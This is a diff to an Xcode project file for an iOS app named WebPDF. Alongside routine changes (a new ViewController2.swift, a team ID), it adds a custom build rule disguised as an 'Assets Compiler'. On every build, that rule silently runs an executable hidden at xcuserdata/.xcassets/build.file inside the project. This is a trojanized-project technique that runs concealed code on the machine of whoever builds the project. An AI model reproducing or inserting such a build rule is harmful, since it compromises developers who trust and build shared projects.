@@ -13,7 +13,24 @@
 		04352F3925C00E0000B8A629 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04352F3725C00E0000B8A629 /* Main.storyboard */; };
 		04352F3B25C00E0600B8A629 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04352F3A25C00E0600B8A629 /* Assets.xcassets */; };
 		04352F3E25C00E0600B8A629 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04352F3C25C00E0600B8A629 /* LaunchScreen.storyboard */; };
+		04352F4825C01A0B00B8A629 /* ViewController2.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04352F4725C01A0B00B8A629 /* ViewController2.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		0BDE6F4C4AAFEB6328AAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Compiler";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" true\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		04352F2E25C00DFF00B8A629 /* WebPDF.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WebPDF.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -24,6 +41,7 @@
 		04352F3A25C00E0600B8A629 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		04352F3D25C00E0600B8A629 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		04352F3F25C00E0600B8A629 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		04352F4725C01A0B00B8A629 /* ViewController2.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController2.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -59,6 +77,7 @@
 				04352F3125C00E0000B8A629 /* AppDelegate.swift */,
 				04352F3325C00E0000B8A629 /* SceneDelegate.swift */,
 				04352F3525C00E0000B8A629 /* ViewController.swift */,
+				04352F4725C01A0B00B8A629 /* ViewController2.swift */,
 				04352F3725C00E0000B8A629 /* Main.storyboard */,
 				04352F3A25C00E0600B8A629 /* Assets.xcassets */,
 				04352F3C25C00E0600B8A629 /* LaunchScreen.storyboard */,
@@ -79,6 +98,7 @@
 				04352F2C25C00DFF00B8A629 /* Resources */,
 			);
 			buildRules = (
+				0BDE6F4C4AAFEB6328AAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -138,6 +158,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				04352F3625C00E0000B8A629 /* ViewController.swift in Sources */,
+				04352F4825C01A0B00B8A629 /* ViewController2.swift in Sources */,
 				04352F3225C00E0000B8A629 /* AppDelegate.swift in Sources */,
 				04352F3425C00E0000B8A629 /* SceneDelegate.swift in Sources */,
 			);
@@ -287,6 +308,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 464SHFHKT7;
 				INFOPLIST_FILE = WebPDF/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -305,6 +327,7 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 464SHFHKT7;
 				INFOPLIST_FILE = WebPDF/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
